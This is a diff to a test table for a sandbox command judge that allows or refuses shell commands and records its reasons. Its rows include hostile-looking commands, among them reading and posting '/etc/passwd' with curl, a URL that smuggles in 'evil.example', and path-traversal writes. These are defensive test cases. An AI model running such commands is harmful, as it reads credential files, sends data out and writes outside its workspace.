@@ -273,8 +273,10 @@ _TABLE = [
     _row("N2", "git clone https://github.com/o/r.git", False, _NETWORK),
     _row("N3", "curl -s example.com/x", True),
     _row("N4", "curl -s example.com", True),
-    _row("N5", "curl -s 127.0.0.1:9/x", False, _outside("/x")),
-    _row("N6", "git clone git@github.com:o/r.git", False, _outside("/r.git")),
+    # D5 (the-shell-judge-reads-a-word-whole): a schemeless network address is read on the whole
+    # word, before rule 3, so these are refused as network addresses rather than by the backstop.
+    _row("N5", "curl -s 127.0.0.1:9/x", False, _NETWORK),
+    _row("N6", "git clone git@github.com:o/r.git", False, _NETWORK),
     _row("N7", "curl file:///etc/passwd", False, _outside("file:///etc/passwd")),
     # F331: N7's rule, as a write. On POSIX the whole-command regex allowed this, and curl wrote
     # the file.
@@ -282,7 +284,9 @@ _TABLE = [
     # Glued paths: the backstop's rows.
     _row("G1", "curl -o/tmp/x $HUB_URL/api", False, _outside("/tmp/x")),
     _row("G2", "curl -d @/etc/passwd $HUB_URL/api", False, _outside("/etc/passwd")),
-    _row("G3", "gcc -I../include x.c", False, _outside("/include")),
+    # D2 (the-shell-judge-reads-a-word-whole): rule 6 judges the glued option's value as the piece
+    # it is, so the reason quotes the whole traversal rather than the backstop's tail.
+    _row("G3", "gcc -I../include x.c", False, _outside("../include")),
     _row("G4", "tar -C/tmp -xf a.tar", False, _outside("/tmp")),
     _row("G5", "echo hi > $1/stray.txt", False, _UNCHECKED),
     _row("G6", "echo hi > sub/$X/stray.txt", False, _UNCHECKED),
@@ -290,10 +294,12 @@ _TABLE = [
     _row("X1a", r"echo hi > ..\stray.txt", True),
     _row("X2b", r"type %USERPROFILE%\x", True),
     _row("X3b", r"Get-Content $env:USERPROFILE\x", True),
-    # Residuals, unchanged by this change.
-    _row("X4", "cmd 2>/dev/null", False, _outside("/dev/null")),
-    _row("X5", "python src/*.py", False, _outside("/*.py")),
-    _row("X6", "git show HEAD:sub/hello.py", False, _outside("/hello.py")),
+    # D4 and D2 (the-shell-judge-reads-a-word-whole): these three move from refused to allowed --
+    # X4's `/dev/null` is a bash device named whole, and X5/X6 are a glob and a revision-prefixed
+    # path the old backstop refused only because it scanned for an absolute tail.
+    _row("X4", "cmd 2>/dev/null", True),
+    _row("X5", "python src/*.py", True),
+    _row("X6", "git show HEAD:sub/hello.py", True),
     _row("X7", "python $(pwd)/sub/hello.py", False, _UNCHECKED),
     # A NUL byte: `ntpath.realpath` accepts it, and `posixpath.realpath` raises ValueError, which
     # once escaped `_decide` on POSIX (D5, "Totality").
@@ -329,7 +335,9 @@ _TABLE = [
     _row("E8", 'curl "$HUB_URL"@evil.example/x', False),
     _row("E9", "echo hi > $(echo .)./stray.txt", False, _UNCHECKED),
     _row("E10", "echo hi > `echo .`./stray.txt", False),
-    _row("E11", "sh -c \"echo hi > '.'./stray.txt\"", False, _outside("/stray.txt")),
+    # D2 (the-shell-judge-reads-a-word-whole): rule 6 also judges the word with its quote
+    # characters removed, the reading the inner `sh` joins (`'.'` then `./stray.txt` is `../stray.txt`).
+    _row("E11", "sh -c \"echo hi > '.'./stray.txt\"", False, _outside("../stray.txt")),
     _row("E12", 'sh -c "echo hi > ../stray.txt"', False),
     _row("E13", "curl $HUB_URL/$X", False, _UNCHECKED),
     _row("E14", "echo hi > $HUB_URL/../../x", True),
@@ -392,8 +400,11 @@ _BACKSLASH_ROWS = (
         _row("E3", r"echo hi > .\./stray.txt", False),
         # The workspace, written in MSYS form: `os.path` on Windows reads `/c/...` as `C:\c\...`.
         _row("X9", "python <msys>/sub/hello.py", False),
-        _row("Z1", r'sort -o"..\stray.txt" notes.md', False, _outside(r"\stray.txt")),
-        _row("Z2", r'curl -o"..\out" http://127.0.0.1:8016/api', False, _outside(r"\out")),
+        # D2: the glued option's value is judged as the piece it is, so the reason quotes the
+        # whole traversal rather than the backstop's tail. Z3 is unchanged: `_GLUED_OPTION_RE`
+        # consumes the alphanumeric run `Isub`, leaving the piece `\include`, still outside.
+        _row("Z1", r'sort -o"..\stray.txt" notes.md', False, _outside(r"..\stray.txt")),
+        _row("Z2", r'curl -o"..\out" http://127.0.0.1:8016/api', False, _outside(r"..\out")),
         _row("Z3", r'gcc -I"sub\include" x.c', False, _outside(r"\include")),
     ]
     if _WINDOWS
